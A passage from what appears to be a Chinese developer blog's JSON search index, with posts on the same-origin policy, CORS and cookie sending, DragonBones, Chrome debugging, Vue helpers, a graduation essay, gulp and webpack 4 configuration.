</p>\n<ul>\n<li>不同源之前的cookie无法进行读取</li>\n</ul>\n</li>\n<li><p>非绝对性</p>\n<ul>\n<li>同源策略通常允许嵌入外部资源，列如在网页中使用video、script、img嵌入外部资源，同源策略关注的是，页面加载js所在的域，而不是页面存放js所在的域。通常不允许读操作，例如嵌入iframe读取不同源的文档内容。</li>\n<li>h5提供了postMessage可以解决不同域消息通知问题，可自行百度这里就不详细赘述</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>关于同源策略相关的问题</p>\n</blockquote>\n<ul>\n<li>没有同源策略会怎样，为什么同源策略禁止读操作<ul>\n<li>设想你打开了一个银行网站a，这是一个钓鱼网站，这个钓鱼网站通过iframe嵌入了工商银行网站，用户进入钓鱼网站后，在没有同源策略限制的情况下会发生什么呢？</li>\n<li>银行页的DOM元素将被修改</li>\n<li>银行卡页面的DOM属性将被修改</li>\n<li>钓鱼网站将会获取用户cookie，支付密码等信息，可以伪造用户请求，发起转帐等操作</li>\n</ul>\n</li>\n<li>有了同源策略会怎样<ul>\n<li>页面在执行js脚本前，先确定当前执行脚本是不是当前域的，若不是当前域，则禁止js脚本执行</li>\n<li>注意浏览器不关心你的js脚本是不是从当前域加载过来的，浏览器只关心执行js的页面是不是和当前页面同源</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>为什么<code>&lt;script&gt;&lt;video&gt;&lt;img&gt;&lt;audio&gt;</code>等带src标签可以不遵守，同源策略。可以跨域嵌入</p>\n</blockquote>\n<ul>\n<li>若大型网站，每个资源都必须同源，那所有资源都必须放在同一台服务器上。网站的构建将会受到一定的限制</li>\n<li>同时页面内容引入的外部资源，将会由网站开发人员定义引入，网站开发人员会确定引入资源的安全性</li>\n<li>网站a.com可以通过<code>&lt;script src=&quot;www.baidu.com/b.js&quot;&gt;&lt;/script&gt;</code>，a网站引入了b网站的脚本，这完全是可以的，不受任何限制，可以这样认为，这要当前页面引入的资源都认为，这个资源和当前页面同源，而不关心这个资源具体从哪个资源引入</li>\n</ul>\n<blockquote>\n<p>对于跨域资访问说明</p>\n</blockquote>\n<ul>\n<li>不同浏览器的跨域访问限制条件并不一定一致，有的允许跨域访问indexDB、有的不允许跨域写操作</li>\n<li>其他跨域访问机制:CORS允许一个域向另一个域发送AJAX请求、OAuth(跨域授权)</li>\n<li>严格的同源策略，限制所有非源资源的读写，非源资源的嵌入。这样开发者必须将所有资源放至同一台服务器上，这样不免限制了灵活性和扩展性</li>\n<li>现在的同源策略，对方便和安全之前作出了权衡，既保证了安全性，也提升了方便性</li>\n</ul>\n<h2 id=\"跨域方法\"><a href=\"#跨域方法\" class=\"headerlink\" title=\"跨域方法\"></a>跨域方法</h2><p><code>前面已经大概讲了同源策略的相关概念</code></p>\n<blockquote>\n<p>几种跨域访问策略</p>\n</blockquote>\n<ul>\n<li>document.domain设置<ul>\n<li>可通过document.domain进行设置不同域名共享cookie,设置<code>document.domain=demo.com;</code>这样a1.demo.com和a2.demo.com就可以共享cookie(这种方法只适用于cookie和iframe)</li>\n</ul>\n</li>\n<li>JSONP<ul>\n<li>是开发者通过对同源策略的了解，开发的一种非官方的跨域数据交互协议</li>\n<li>利用了<code>&lt;script&gt;&lt;audio&gt;&lt;img&gt;</code>的src属性天生支持跨域的属性开发的</li>\n<li>开发者利用js动态创建script标签，script的src请求的地址是服务端地址接口地址，并且在请求地址后约定返回客户端的函数名称，客户端首先定义好接收服务端参数的函数，发送至服务端，服务端返回一个自执行函数，函数的参数是服务端返回的值，函数是客户端定义好的</li>\n</ul>\n</li>\n<li>postMessage方法<ul>\n<li>postMessage是h5新定义的，支持跨域资源访问的方式</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>CORS请求</p>\n</blockquote>\n<p><strong>CORS</strong>是W3C的一个标准，全称局域资源共享<br><code>它允许浏览器向不同源域发送XMLHttpRequest请求，从而克服了AJAX只能向同源域名发出AJAX的限制</code></p>\n<blockquote>\n<p>使用CORS需要浏览器和服务端同时支持，浏览器版本必须大于IE10，浏览器端若是支持，会自动完成浏览器端的操作。因此使用CORS关键是服务端，支持CORS跨域请求</p>\n</blockquote>\n<ul>\n<li>跨域资源请求分为<strong>简单请求</strong>和<strong>非简单请求</strong></li>\n<li><p>简单请求(同时满足以下条件)</p>\n<ul>\n<li>请求方式是下面三种之一:1.HEAD 2.POST 3.GET</li>\n<li><p>HEAD参数不超出:</p>\n<ul>\n<li>Content-Type:只限于三个值<ul>\n<li>application/x-www-form-urlencoded、</li>\n<li>multipart/form-data、text/plain、</li>\n<li>Accept</li>\n</ul>\n</li>\n<li>Accept-Language</li>\n<li>Content-Language</li>\n<li>Last-Event-ID</li>\n</ul>\n</li>\n<li><p>对于简单请求，浏览器会在request的Header中添加origin: 当前url，当上请求源地址</p>\n<ul>\n<li>如果请求源不在服务端请求源白名单内，服务端不会返回Access-Control-Allow-Origin，XMLHttpRequest会报出错误异常</li>\n<li>如果origin在服务端白名单内，会返回<ul>\n<li>Access-Control-Allow-Origin: <a href=\"http://api.bob.com\" target=\"_blank\" rel=\"noopener\">http://api.bob.com</a></li>\n<li>Access-Control-Allow-Credentials: true</li>\n<li>Access-Control-Request-Method: POST,GET,OPTIONS,PUT</li>\n<li>Access-Control-Expose-Headers: FooBar</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>非简单请求<ul>\n<li>对于非简单请求，浏览器在进行交互前会发送options方法，进行预检测</li>\n<li>服务端会对:<code>Origin、Access-Control-Request-Method和Access-Control-Request-Header</code>字段进行检测，若检测通过，会发出正常的XMLHttpRequest请求</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>Access-Control-Allow-Credentials: true</p>\n</blockquote>\n<p>用来决定，进行CORS共享是，是否发送cookie</p>\n<p><strong>CORS跨域请求比JSONP请求方法更多，传输内容类型更多，但兼容性没有JSONP强</strong></p>\n<h3 id=\"同域-跨域ajax请求到底会不会带上cookie\"><a href=\"#同域-跨域ajax请求到底会不会带上cookie\" class=\"headerlink\" title=\"同域/跨域ajax请求到底会不会带上cookie?\"></a>同域/跨域ajax请求到底会不会带上cookie?</h3><p>这个问题与你发起<code>ajax</code>请求的方式有关<br><code>fetch</code>在默认情况下, 不管是同域还是跨域ajax请求都不会带上cookie, <strong>只有当设置了 credentials 时才会带上该ajax请求所在域的cookie</strong>, 服务端需要设置响应头 <code>Access-Control-Allow-Credentials: true</code>, 否则浏览器会因为安全限制而报错, 拿不到响应<br>axios和jQuery在同域ajax请求时会带上cookie, 跨域请求不会, 跨域请求需要设置 <code>withCredentials</code> 和服务端响应头</p>\n<blockquote>\n<p>使fetch带上cookie</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fetch(url, &#123;</span><br><span class=\"line\">    credentials: &quot;include&quot;, // include, same-origin, omit</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>include: 跨域ajax带上cookie</li>\n<li>same-origin: 仅同域ajax带上cookie</li>\n<li>omit: 任何情况都不带cookie</li>\n</ul>\n<blockquote>\n<p>使axios带上cookie</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">axios.get(&apos;http://server.com&apos;, &#123;withCredentials: true&#125;)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>jQuery 携带cookie</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$.ajax(&#123;</span><br><span class=\"line\">    method: &apos;get&apos;,</span><br><span class=\"line\">    url: &apos;http://server.com&apos;,</span><br><span class=\"line\">    xhrFields: &#123;</span><br><span class=\"line\">        withCredentials: true</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n","categories":["http"],"tags":["http"]},{"title":"龙骨","url":"http://zhoushaw.github.io/2018/09/27/learning/game/龙骨/","content":"<h2 id=\"基本操作\"><a href=\"#基本操作\" class=\"headerlink\" title=\"基本操作\"></a>基本操作</h2><blockquote>\n<p>替换图片</p>\n</blockquote>\n<p>在骨架装配模式=&gt;选中对应图片=&gt;右击选择替换图片</p>\n<blockquote>\n<p>导入psd</p>\n</blockquote>\n<p>右侧资源列表&gt;library&gt;导入资源</p>\n<div><a id=\"more\"></a></div>\n\n\n<h2 id=\"龙骨操作\"><a href=\"#龙骨操作\" class=\"headerlink\" title=\"龙骨操作\"></a>龙骨操作</h2><p>1.拖动画布<br>两指安装面板滑动</p>\n<p>2.创建龙骨<br>画布右上角=&gt;激活创建龙骨按钮=&gt;在资源树面板选中对应的龙骨父级=&gt;按住左键创建</p>\n<p>3.设置龙骨<br>选中龙骨=&gt;右键=&gt;选择相应命令</p>\n<p>4.龙骨绑定图片</p>\n<p>创建龙骨未松开左键=&gt;按住command=&gt;点击需要绑定的图片</p>\n<p>5.移动龙骨位置</p>\n<p>选中龙骨=&gt;左下角面板=&gt;点击子图片可控(图片不受控制)=&gt;移动龙骨即可</p>\n<p>6.移动父骨骼</p>\n<p>选中父骨骼=&gt;左下角面板=&gt;点击子骨骼可控(子骨骼不受控制)=&gt;图片骨骼即可</p>\n<p>7.骨骼、图片可见</p>\n<p>左下角面板=&gt;骨骼可见、画布可见</p>\n<p>8.图片和骨骼可选、可见</p>\n<p>场景树面板=&gt;资源右侧=&gt;可选、可见按钮</p>\n<h2 id=\"操作\"><a href=\"#操作\" class=\"headerlink\" title=\"操作\"></a>操作</h2><p>1.只允许平移<br>左下角操作面板=&gt;平移按钮</p>\n<p>2.只允许旋转<br>左下角操作面板=&gt;旋转按钮</p>\n","categories":["game"],"tags":["egret"]},{"title":"chrome调试方案","url":"http://zhoushaw.github.io/2018/07/08/learning/font-end/debugger/chrome-debugger/","content":"<div><a id=\"more\"></a></div>\n\n\n<h2 id=\"如何进行chrome调试\"><a href=\"#如何进行chrome调试\" class=\"headerlink\" title=\"如何进行chrome调试\"></a>如何进行chrome调试</h2><p>1.使用chrome进行调试pc必须翻墙<br>2.打开chrome进入chrome://inspect/#devices<br>3.使用数据线进行设备连接:<br>设置=&gt;更多设置=&gt;开发者选项，打开USB调试，模拟点击等等功能<br>4.如果没有开发者:设置-关于手机-手机配置信息-连点“版本号”7次</p>\n<p><a href=\"https://deskid.github.io/2018/04/02/h5-debug/\" target=\"_blank\" rel=\"noopener\">协议</a></p>\n<h2 id=\"chrome常用调试方法\"><a href=\"#chrome常用调试方法\" class=\"headerlink\" title=\"chrome常用调试方法\"></a>chrome常用调试方法</h2><blockquote>\n<p>代码搜索</p>\n</blockquote>\n<p>command + option + f可打开chrome全局搜索，搜索包括代码库中内容</p>\n","categories":["debugger"],"tags":["debugger"]},{"title":"vue源码中常用函数","url":"http://zhoushaw.github.io/2018/06/05/learning/font-end/vue/vue源码常用函数/","content":"<h2 id=\"isReserved\"><a href=\"#isReserved\" class=\"headerlink\" title=\"isReserved\"></a>isReserved</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function isReserved (str) &#123;</span><br><span class=\"line\">  var c = (str + &apos;&apos;).charCodeAt(0);</span><br><span class=\"line\">  return c === 0x24 || c === 0x5F</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>该函数的作用是：检查字符串是否是以 $ 或者 _ 开始的,在vue中用于检查是否该变量可以用于代理至<code>vm</code>中</p>\n<p>我们在这里需要学习的是 charCodeAt() 这个方法。它返回的是 Unicode 编码的字符串表示的值。</p>\n<p>比如说：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&apos;abc&apos;.charCodeAt(0);  // 97</span><br><span class=\"line\">&apos;abc&apos;.charCodeAt(1);  // 98</span><br></pre></td></tr></table></figure>\n","categories":["vue"],"tags":["vue"]},{"title":"2018毕业了","url":"http://zhoushaw.github.io/2018/06/02/2018毕业了的/","content":"<div><a id=\"more\"></a></div>\n\n<h2 id=\"致远方\"><a href=\"#致远方\" class=\"headerlink\" title=\"致远方\"></a>致远方</h2><p>思绪里最近有点乱，心里有一个声音响起提醒着我来写点什么吧，也算对自己这一年多的一个总结吧。</p>\n<p>在情感思绪上我总是那一个后知后觉的人，总比别人慢上半拍。大学四年校园生活结束了，自己的学生时代也结束了，好像每逢毕业季，在临近离别时总是没那么强烈的感受，再后感受确是如此强烈。那些一起生活四年的好友，再见也不知何时了，在校的生活点滴在脑海中闪过，感激与你们相伴的每一天，毕业后的联系可能也会略显单薄，希望你们都能过上自己想要的生活。也期待明天更好的自己</p>\n<p>2017年6月的尾声还是决定了与软件学院一起前往深圳实训基地，并留在了深圳，整个大四在校时间非常短暂，也略显遗憾吧，没有和基友们一起驰骋球场、网吧五连坐了~</p>\n<h2 id=\"前端\"><a href=\"#前端\" class=\"headerlink\" title=\"前端\"></a>前端</h2><p>已经忘记了自己啥时候入坑前端的，仔细想来应该是大三时，那时自己也深感迷茫，考研已经深知自己已经不是读书那块料了，由于班上女生较多,很多人都决定考编，从事计算机的也算凤毛麟角</p>\n<p>开始学习网页制作是大三时，那时被炫酷的flash动画吸引了吧，那时候就觉得这么炫酷的东西，要不学一波~当然那时候学习的Dreamweaver那套老掉牙的东西，以至于花了大量时间学了派不上用场的东西，开始接触html、css是Dreamweaver上的编码功能，开始通过代码实现一些简单的效果，后来才了解到系统化的前端体系。</p>\n<p>大四已经决心出去闯荡一番，但已深知自己羽翼尚未丰满，最后前往学校在深圳的实训基地，那是就好几好友开始了深圳的实训经历了，那段时间还是很感激自己的努力，也算是自己进步最快的时候了吧。短期的实训结束后开始了找工作的旅程，同班同学进阿里、百度、网易的都有，自己也心有不甘。最终秋招结束，也没有进入自己心仪的大厂，深感竞争太激烈。</p>\n<p>没办法只能开始投简历了，一开始投的简历大多都石沉大海，最终还是得到了几家面试机会，第一次面试还记得是“大管家”，办公环境很不错，看到卷子后比较简单，为了写的比较全面没注意时间，最后第一轮笔试就未通过。</p>\n<p>第二次面试是在实训基地较近的公司，项目外包公司，就一轮面完技术主管迫不及待发offer~~一脸懵，一家五十人左右的外包公司，承诺表现突出一个月转正。</p>\n<p>最后又面了一家自己觉得超级棒的公司，最终在hr面结束了。同学都劝说现在就业形势难，最后还是妥协了</p>\n<h2 id=\"工作\"><a href=\"#工作\" class=\"headerlink\" title=\"工作\"></a>工作</h2><blockquote>\n<p>深圳</p>\n</blockquote>\n<p>记得第一天报道，就叫到了老板的办公室，老板也是技术开发的，还是非常nice的老总吧。有一个项目之前由他负责，他问我之前有没有了解过小程序，我说没有他让我现在看下，有个项目要马上让我接手，了解之后是为顺丰定制的一款应用，一个超级大的前端项目，但十分不理解，第一次进入公司就给一个这么大的项目，也真是心大,而且那也是自己第一次接触小程序。</p>\n<p>外包公司还是不建议大家去的，不过值得庆幸的事同事还是比较nice，新人去外包公司，一开始压力会比较大，而且也都是廉价劳动力，对个人的长久职业生涯发展不利记。</p>\n<p>当然记忆最深刻的还是的加班，其实我是不反对加班的，但那么加班的我还真没见识过，我整整五天没睡觉，实在是无力吐槽了，那时候深深感觉自己以后再也不会进外包公司了。</p>\n<p>在刚进入公司的时候那时候正好遇上顺丰同城上线，没办法前人填坑后人补，这个项目是一个小程序，而且没有使用任何小程序模块化框架，也就是说，一个页面的所有代码都怼在wxml、js中。代码质量我就不说了，记得当初到手的项目页面最多的一个，js代码差不多五千行，最少的也有一千多行。这是个什么概念555~，真是心疼那时候的自己，刚好遇到了甲方的顺丰，那时候要求上线。开发周期短，需求量却很大，最后导致临近上线前的崩盘，也就导致当初我五天没睡觉，那时候压力真是空前的大，感觉真个人都要崩溃，还好自己挺住了，心疼自己~</p>\n<p>年初就已经做好打算离开，准备一段时间后又开始了自己的找工作之旅。当然一开始也不是非常顺利，毕竟已经很长时间没有参加面试了，自己的基础知识点也显得稍有薄弱。那段时间边工作、边面试、边准备论文，还好自己也抗了过去。前前后后也拿了几家offer，最终还是决定离开深圳，来杭州的蘑菇街</p>\n<blockquote>\n<p>杭州</p>\n</blockquote>\n<p>初来杭州，感觉空气都是香的，也许是一种释怀吧</p>\n","categories":["life"],"tags":["life"]},{"title":"gulp","url":"http://zhoushaw.github.io/2018/04/27/learning/font-end/webpack/gulp/","content":"<div><a id=\"more\"></a></div>\n\n<h2 id=\"引言\"><a href=\"#引言\" class=\"headerlink\" title=\"引言\"></a>引言</h2><ul>\n<li>易于使用:通过代码优于配置的策略，Gulp 让简单的任务简单，复杂的任务可管理。</li>\n<li>构建快速:利用 Node.js 流的威力，你可以快速构建项目并减少频繁的 IO 操作。</li>\n<li>插件高质:Gulp 严格的插件指南确保插件如你期望的那样简洁高质得工作。</li>\n<li>易于学习:通过最少的 API，掌握 Gulp 毫不费力，构建工作尽在掌握:如同一系列流管道。</li>\n</ul>\n<h2 id=\"依赖安装\"><a href=\"#依赖安装\" class=\"headerlink\" title=\"依赖安装\"></a>依赖安装</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install gulp-cli -g</span><br><span class=\"line\">npm install gulp -D</span><br><span class=\"line\">touch gulpfile.js</span><br><span class=\"line\">gulp --help</span><br></pre></td></tr></table></figure>\n<h2 id=\"错误检测\"><a href=\"#错误检测\" class=\"headerlink\" title=\"错误检测\"></a>错误检测</h2><p>gulp有一个插件，gulp-util，用来打印日志，看具体什么地方出错了。</p>\n<p>在gulpfile.js打包压缩的命令里。。增加一个错误的打印。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var gutil = require(&apos;gulp-util&apos;);</span><br><span class=\"line\">/ 合并，压缩文件</span><br><span class=\"line\">    gulp.task(&apos;scripts&apos;,[&apos;copy&apos;], function() &#123;</span><br><span class=\"line\">        gulp.src(&apos;./dist/js/page/**/*.js&apos;)</span><br><span class=\"line\">            .pipe(sourcemaps.init())</span><br><span class=\"line\">            .pipe(uglify(&#123;</span><br><span class=\"line\">                mangle:true,</span><br><span class=\"line\">                compress: true</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            ))</span><br><span class=\"line\">            .on(&apos;error&apos;, function (err) &#123;</span><br><span class=\"line\">                gutil.log(gutil.colors.red(&apos;[Error]&apos;), err.toString());</span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">            .pipe(sourcemaps.write(&apos;../maps&apos;))</span><br><span class=\"line\">            .pipe(gulp.dest(&apos;./dist/js/page&apos;));</span><br><span class=\"line\">    &#125;);</span><br></pre></td></tr></table></figure>\n<p>这个时候，，打印的时候具体错误就会有提示。<br>这样的话我们就可以轻松的知道问题出在哪里。然后去修改相应的js文件即可。</p>\n<h2 id=\"转化es6代码到es5\"><a href=\"#转化es6代码到es5\" class=\"headerlink\" title=\"转化es6代码到es5\"></a>转化es6代码到es5</h2><blockquote>\n<p>依赖安装</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install --save-dev gulp-babel</span><br><span class=\"line\">// 安装 Gulp 上 Babel 的插件。</span><br><span class=\"line\"></span><br><span class=\"line\">npm install --save-dev babel-preset-es2015</span><br><span class=\"line\">// 安装 Babel 上将 ES6 转换成 ES5 的插件。</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>config</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//gulp 配置:</span><br><span class=\"line\"></span><br><span class=\"line\">//复制代码</span><br><span class=\"line\">var gulp = require(&quot;gulp&quot;);</span><br><span class=\"line\">var babel = require(&quot;gulp-babel&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">gulp.task(&quot;default&quot;, function () &#123;</span><br><span class=\"line\">  return gulp.src(&quot;src/**/*.js&quot;)// ES6 源码存放的路径</span><br><span class=\"line\">    .pipe(babel()) </span><br><span class=\"line\">    .pipe(gulp.dest(&quot;dist&quot;)); //转换成 ES5 存放的路径</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">//复制代码</span><br><span class=\"line\">// babel配置:</span><br><span class=\"line\"></span><br><span class=\"line\">//在项目根路径创建文件 .babelrc。内容为</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;presets&quot;: [&quot;es2015&quot;]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","categories":["js"],"tags":["gulp"]},{"title":"webpack优化","url":"http://zhoushaw.github.io/2018/04/27/learning/font-end/webpack/webpack-optimize/","content":"<div><a id=\"more\"></a></div>\n\n<h2 id=\"体积优化\"><a href=\"#体积优化\" class=\"headerlink\" title=\"体积优化\"></a>体积优化</h2><p>插件:<br><code>yarn install webpack-bundle-analyzer --save-dev</code></p>\n<p>webpack.prod.conf.js配置:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const BundleAnalyzerPlugin = require(&apos;webpack-bundle-analyzer&apos;).BundleAnalyzerPlugin;</span><br><span class=\"line\"></span><br><span class=\"line\">module.exports = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  plugins: [</span><br><span class=\"line\"></span><br><span class=\"line\">    new BundleAnalyzerPlugin()</span><br><span class=\"line\"></span><br><span class=\"line\">  ]</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>启动:<br>在package.json中的script上添加<br><code>“analyz”: “NODE_ENV=production npm_config_report=true npm run build”</code></p>\n<p>使用npm run analyz</p>\n<h2 id=\"检测打包时间\"><a href=\"#检测打包时间\" class=\"headerlink\" title=\"检测打包时间\"></a>检测打包时间</h2><p>在package.json内加入–profile，它会告诉你编译过程中哪些步骤耗时最长。</p>\n","categories":["js"],"tags":["gulp"]},{"title":"webpack","url":"http://zhoushaw.github.io/2018/04/26/learning/font-end/webpack/webpack4.0/","content":"<div><a id=\"more\"></a></div>\n\n<h1 id=\"wepback-4-0\"><a href=\"#wepback-4-0\" class=\"headerlink\" title=\"wepback 4.0\"></a>wepback 4.0</h1><h2 id=\"零配置快速构建\"><a href=\"#零配置快速构建\" class=\"headerlink\" title=\"零配置快速构建\"></a>零配置快速构建</h2><blockquote>\n<p>创建文件夹</p>\n</blockquote>\n<pre><code>mkdir webpack-4-quickstart &amp;&amp; cd $_\n</code></pre><blockquote>\n<p> 初始化</p>\n</blockquote>\n<p><code>npm init -y</code></p>\n<blockquote>\n<p>安装依赖</p>\n</blockquote>\n<p><code>npm i webpack-cli --save-dev</code><br><code>npm i webpack --save-dev</code></p>\n<blockquote>\n<p>增加快速构建</p>\n</blockquote>\n<p>在package.json中添加build命令<br><code>&quot;scripts&quot;: {\n  &quot;build&quot;: &quot;webpack&quot;\n}</code></p>\n<blockquote>\n<p>注意</p>\n</blockquote>\n<p>webpack4.0后默认必须<br>在根目录新建./src/index.js为默认，否则无法build</p>\n<blockquote>\n<p>实例</p>\n</blockquote>\n<ol>\n<li>新建./src/index.js，内容为console.log(‘test build’);</li>\n<li><code>npm run build</code>后将在根目录生成dist/main.js</li>\n</ol>\n<h2 id=\"生产环境和开发环境的mode\"><a href=\"#生产环境和开发环境的mode\" class=\"headerlink\" title=\"生产环境和开发环境的mode\"></a>生产环境和开发环境的mode</h2><blockquote>\n<p>风格</p>\n</blockquote>\n<p>webpack4.0有两种项目风格<br>1.a configuration file for development<br>2.a configuration file for production</p>\n<blockquote>\n<p>设置项目打包环境</p>\n</blockquote>\n<p>在package.json中添加命令，区分dev，和product<br><code>&quot;scripts&quot;: {\n  &quot;dev&quot;: &quot;webpack --mode development&quot;,\n  &quot;build&quot;: &quot;webpack --mode production&quot;\n}</code></p>\n<blockquote>\n<p>特点</p>\n</blockquote>\n<p><code>npm run dev</code>得到的模块是未压缩的<br><code>npm run build</code>得到的模块是压缩后的</p>\n<h2 id=\"修改默认输入输出文件\"><a href=\"#修改默认输入输出文件\" class=\"headerlink\" title=\"修改默认输入输出文件\"></a>修改默认输入输出文件</h2><blockquote>\n<p>特点</p>\n</blockquote>\n<p>webpack的零配置优点显著，但如何自定义导入导出文件目录</p>\n<blockquote>\n<p>自定义导入导出</p>\n</blockquote>\n<p>配置package.json</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;scripts&quot;: &#123;</span><br><span class=\"line\">    &quot;dev&quot;: &quot;webpack --mode development ./test/from/js/index.js --output ./test/to/main.js&quot;,</span><br><span class=\"line\">    &quot;build&quot;: &quot;webpack --mode production ./test/from/js/index.js --output ./test/to/main.js&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"添加babel\"><a href=\"#添加babel\" class=\"headerlink\" title=\"添加babel\"></a>添加babel</h2><blockquote>\n<p>引言</p>\n</blockquote>\n<p>并不是所有浏览器都能能好支持es6特性，webpack自身不具备将es6或者更高ECMAscript转换成es5，但webpack提供loader可以将其转换成es5特性。尽管webpack零配置的特性，但是对于loader的使用任然需要通过配置来发挥其特效</p>\n<blockquote>\n<p>安装依赖</p>\n</blockquote>\n<ul>\n<li>babel-core</li>\n<li>babel-loader</li>\n<li>babel-preset-env for compiling Javascript ES6 code down to ES5</li>\n</ul>\n<p><code>npm i babel-core babel-loader babel-preset-env --save-dev</code></p>\n<blockquote>\n<p>配置</p>\n</blockquote>\n<p>webpack提供两种配置babel的方式:</p>\n<ol>\n<li>使用babel的loader和配置文件<br>新建 <strong>.babelrc</strong>文件名，并且在文件中添加</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;presets&quot;: [</span><br><span class=\"line\">        &quot;env&quot;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用webpack.config.js</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">module.exports = &#123;</span><br><span class=\"line\">  module: &#123;</span><br><span class=\"line\">    rules: [</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        test: /\\.js$/,</span><br><span class=\"line\">        exclude: /node_modules/,</span><br><span class=\"line\">        use: &#123;</span><br><span class=\"line\">          loader: &quot;babel-loader&quot;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    ]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>配置package.json和配置文件<br>使用<strong>–module-bind</strong>在<strong>npm</strong>脚本中</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 